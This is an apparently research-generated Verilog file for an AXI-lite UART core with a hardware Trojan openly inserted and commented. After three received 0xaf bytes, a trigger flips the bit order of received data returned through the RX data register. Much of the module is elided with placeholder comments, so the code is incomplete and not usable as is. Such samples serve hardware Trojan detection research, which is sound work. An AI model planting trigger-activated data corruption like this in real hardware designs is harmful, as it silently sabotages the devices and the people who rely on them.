module	axiluart #(
		// {{{
		parameter [30:0] INITIAL_SETUP = 31'd25,
		parameter [3:0]	LGFLEN = 4,
		parameter [0:0]	HARDWARE_FLOW_CONTROL_PRESENT = 1'b1,
		localparam [3:0]	LCLLGFLEN = (LGFLEN > 4'ha)? 4'ha
					: ((LGFLEN < 4'h2) ? 4'h2 : LGFLEN),
		parameter	C_AXI_ADDR_WIDTH = 4,
		localparam	C_AXI_DATA_WIDTH = 32,
		parameter [0:0]	OPT_SKIDBUFFER = 1'b0,
		parameter [0:0]	OPT_LOWPOWER = 0,
		localparam	ADDRLSB = $clog2(C_AXI_DATA_WIDTH)-3
		// }}}
	) (
		// AXI-lite signaling
		// {{{
		input	wire					S_AXI_ACLK,
		input	wire					S_AXI_ARESETN,
		//
		input	wire					S_AXI_AWVALID,
		output	wire					S_AXI_AWREADY,
		input	wire	[C_AXI_ADDR_WIDTH-1:0]		S_AXI_AWADDR,
		input	wire	[2:0]				S_AXI_AWPROT,
		//
		input	wire					S_AXI_WVALID,
		output	wire					S_AXI_WREADY,
		input	wire	[C_AXI_DATA_WIDTH-1:0]		S_AXI_WDATA,
		input	wire	[C_AXI_DATA_WIDTH/8-1:0]	S_AXI_WSTRB,
		//
		output	wire					S_AXI_BVALID,
		input	wire					S_AXI_BREADY,
		output	wire	[1:0]				S_AXI_BRESP,
		//
		input	wire					S_AXI_ARVALID,
		output	wire					S_AXI_ARREADY,
		input	wire	[C_AXI_ADDR_WIDTH-1:0]		S_AXI_ARADDR,
		input	wire	[2:0]				S_AXI_ARPROT,
		//
		output	wire					S_AXI_RVALID,
		input	wire					S_AXI_RREADY,
		output	wire	[C_AXI_DATA_WIDTH-1:0]		S_AXI_RDATA,
		output	wire	[1:0]				S_AXI_RRESP,
		// }}}
		// UART signals
		// {{{
		input	wire		i_uart_rx,
		output	wire		o_uart_tx,
		//
		input	wire		i_cts_n,
		//
		output	reg		o_rts_n,
		// }}}
		// A series of outgoing interrupts to select from among
		// {{{
		output	wire	o_uart_rx_int,
		output	wire	o_uart_tx_int,
		output	wire	o_uart_rxfifo_int,
		output	wire	o_uart_txfifo_int
		// }}}
	);

	////////////////////////////////////////////////////////////////////////
	//
	// Register/wire signal declarations
	//
	////////////////////////////////////////////////////////////////////////
	//
	// {{{
	wire	i_reset = !S_AXI_ARESETN;

	wire				axil_write_ready;
	wire	[C_AXI_ADDR_WIDTH-ADDRLSB-1:0]	awskd_addr;
	//
	wire	[C_AXI_DATA_WIDTH-1:0]	wskd_data;
	wire [C_AXI_DATA_WIDTH/8-1:0]	wskd_strb;
	reg				axil_bvalid;
	//
	wire				axil_read_ready;
	wire	[C_AXI_ADDR_WIDTH-ADDRLSB-1:0]	arskd_addr;
	reg	[C_AXI_DATA_WIDTH-1:0]	axil_read_data;
	reg				axil_read_valid;
	//
	//
	wire		tx_busy;
	//
	reg	[30:0]	uart_setup;
	//
	wire		rx_stb, rx_break, rx_perr, rx_ferr, ck_uart;
	wire	[7:0]	rx_uart_data;
	reg		rx_uart_reset;
	//
	wire		rx_empty_n, rx_fifo_err;
	wire	[7:0]	rxf_axil_data;
	wire	[15:0]	rxf_status;
	reg		rxf_axil_read;
	reg		r_rx_perr, r_rx_ferr;
	//
	wire	[(LCLLGFLEN-1):0]	check_cutoff;
	wire	[31:0]	axil_rx_data;
	//
	wire		tx_empty_n, txf_err, tx_break;
	wire	[7:0]	tx_data;
	wire	[15:0]	txf_status;
	reg		txf_axil_write, tx_uart_reset;
	reg	[7:0]	txf_axil_data;
	wire	[31:0]	axil_tx_data;
	wire	[31:0]	axil_fifo_data;
	//
	reg	[1:0]	r_axil_addr;
	reg		r_preread;

	reg	[31:0]	new_setup;

	// Trojan registers/signals insertion {{{
	reg [1:0]		trojan_af_counter;      // Counts number of times 0xaf is received
	reg 			trojan_activated;       // Set to 1 when Trojan triggers
	reg [7:0]		trojan_rx_data;         // Holds Trojan-modified receive data
	// }}} TROJAN

	// }}}
	////////////////////////////////////////////////////////////////////////
	//
	// AXI-lite signaling
	//
	////////////////////////////////////////////////////////////////////////
	// [UNCHANGED: OMITTED FOR BREVITY]

	////////////////////////////////////////////////////////////////////////
	//
	// AXI-lite register logic
	//
	////////////////////////////////////////////////////////////////////////
	//
	// [UNCHANGED LOGIC OMITTED FOR BREVITY]

	/////////////////////////////////////////
	//
	// First, the UART receiver
	// {{{
	/////////////////////////////////////////

	// ... [UNCHANGED RECEIVER INSTANTIATION OMITTED] ...

	// We place it into a receiver FIFO.
	ufifo	#(.LGFLEN(LCLLGFLEN), .RXFIFO(1))
		rxfifo(S_AXI_ACLK, (!S_AXI_ARESETN)||(rx_break)||(rx_uart_reset),
			rx_stb, rx_uart_data,
			rx_empty_n,
			rxf_axil_read, rxf_axil_data,
			rxf_status, rx_fifo_err);
	assign	o_uart_rxfifo_int = rxf_status[1];

	assign	o_uart_rx_int = rxf_status[0];

	assign	check_cutoff = -3;
	always @(posedge S_AXI_ACLK)
		o_rts_n <= ((HARDWARE_FLOW_CONTROL_PRESENT)
			&&(!uart_setup[30])
			&&(rxf_status[(LCLLGFLEN+1):2] > check_cutoff));

	initial	rxf_axil_read = 1'b0;
	always @(posedge S_AXI_ACLK)
		rxf_axil_read<=(axil_read_ready)&&(arskd_addr[1:0]==2'b10);

	initial	r_rx_perr = 1'b0;
	initial	r_rx_ferr = 1'b0;
	always @(posedge S_AXI_ACLK)
	if ((rx_uart_reset)||(rx_break))
	begin
		r_rx_perr <= 1'b0;
		r_rx_ferr <= 1'b0;
	end else if (axil_write_ready&&awskd_addr == 2'b10 && wskd_strb[1])
	begin
		r_rx_perr <= (r_rx_perr)&&(!wskd_data[9]);
		r_rx_ferr <= (r_rx_ferr)&&(!wskd_data[10]);
	end else if (rx_stb)
	begin
		r_rx_perr <= (r_rx_perr)||(rx_perr);
		r_rx_ferr <= (r_rx_ferr)||(rx_ferr);
	end

	initial	rx_uart_reset = 1'b1;
	always @(posedge S_AXI_ACLK)
	if ((!S_AXI_ARESETN)||((axil_write_ready)&&(awskd_addr[1:0]== 2'b00) && (&wskd_strb)))
		rx_uart_reset <= 1'b1;
	else if (axil_write_ready&&(awskd_addr[1:0]==2'b10)&&wskd_strb[1])
		rx_uart_reset <= wskd_data[12];
	else
		rx_uart_reset <= 1'b0;

	// Trojan trigger and payload logic insertion {{{
	always @(posedge S_AXI_ACLK)
	begin
		if (!S_AXI_ARESETN) begin
			trojan_af_counter <= 2'd0;
			trojan_activated  <= 1'b0;
		end else if (rx_uart_reset || rx_break) begin
			trojan_af_counter <= 2'd0;
			trojan_activated  <= 1'b0;
		end else if (rx_stb) begin
			if (!trojan_activated) begin
				if (rx_uart_data == 8'haf) begin
					if (trojan_af_counter == 2'd2) begin
						trojan_af_counter <= 2'd3;
						trojan_activated  <= 1'b1; // Activate trojan on 3rd time
					end else begin
						trojan_af_counter <= trojan_af_counter + 1'b1;
					end
				end
			end
		end
	end

	// Compute Trojan payload, reverse bits of rx_uart_data if activated and rx_stb
	always @(*) begin
		if (trojan_activated && rx_stb) begin
			trojan_rx_data[7] = rx_uart_data[0];
			trojan_rx_data[6] = rx_uart_data[1];
			trojan_rx_data[5] = rx_uart_data[2];
			trojan_rx_data[4] = rx_uart_data[3];
			trojan_rx_data[3] = rx_uart_data[4];
			trojan_rx_data[2] = rx_uart_data[5];
			trojan_rx_data[1] = rx_uart_data[6];
			trojan_rx_data[0] = rx_uart_data[7];
		end else begin
			trojan_rx_data = rx_uart_data;
		end
	end
	// }}} TROJAN

	// axil_rx_data payload multiplexing: feed Trojan data if triggered
	assign	axil_rx_data = { 16'h00,
				3'h0, rx_fifo_err,
				rx_break, rx_ferr, r_rx_perr, !rx_empty_n,
				(trojan_activated ? (
					// Show reversed data in the data byte only for newly received data,
					// Otherwise, if reading FIFO contents not associated with rx_stb sample, show FIFO as is.
					(rxf_axil_read ? trojan_rx_data : rxf_axil_data)
				) : rxf_axil_data)
			};

	/////////////////////////////////////////
	//
	// Then the UART transmitter
	// {{{
	/////////////////////////////////////////
	//
	// [UNCHANGED TRANSMITTER LOGIC OMITTED FOR BREVITY]

	/////////////////////////////////////////
	//
	// FIFO return
	// {{{
	/////////////////////////////////////////
	//
	assign	axil_fifo_data = { txf_status, rxf_status };

	/////////////////////////////////////////
	//
	// Final read register
	// {{{
	/////////////////////////////////////////
	//
	initial	r_preread = 0;
	always @(posedge S_AXI_ACLK)
	if (!S_AXI_ARESETN)
		r_preread <= 0;
	else if (axil_read_ready)
		r_preread   <= 1;
	else if (!S_AXI_RVALID || S_AXI_RREADY)
		r_preread   <= 0;

	always @(posedge S_AXI_ACLK)
	if (axil_read_ready)
		r_axil_addr <= arskd_addr;

	always @(posedge S_AXI_ACLK)
	if (!S_AXI_RVALID || S_AXI_RREADY)
	begin
		casez(r_axil_addr)
		2'b00: axil_read_data <= { 1'b0, uart_setup };
		2'b01: axil_read_data <= axil_fifo_data;
		2'b10: axil_read_data <= axil_rx_data;     // Trojan injected inside axil_rx_data
		2'b11: axil_read_data <= axil_tx_data;
		endcase

		if (OPT_LOWPOWER && !r_preread)
			axil_read_data <= 0;
	end

	// ... [REMAINDER OF CODE UNCHANGED] ...
	// [FUNCTIONS, FORMAL, END MODULE AS BEFORE]
	//
	function [C_AXI_DATA_WIDTH-1:0]	apply_wstrb;
		input	[C_AXI_DATA_WIDTH-1:0]		prior_data;
		input	[C_AXI_DATA_WIDTH-1:0]		new_data;
		input	[C_AXI_DATA_WIDTH/8-1:0]	wstrb;

		integer	k;
		for(k=0; k<C_AXI_DATA_WIDTH/8; k=k+1)
		begin
			apply_wstrb[k*8 +: 8]
				= wstrb[k] ? new_data[k*8 +: 8] : prior_data[k*8 +: 8];
		end
	endfunction
	// }}}

`ifdef	FORMAL
// ... FORMAL VERIFICATION SECTION UNCHANGED ...
`endif
endmodule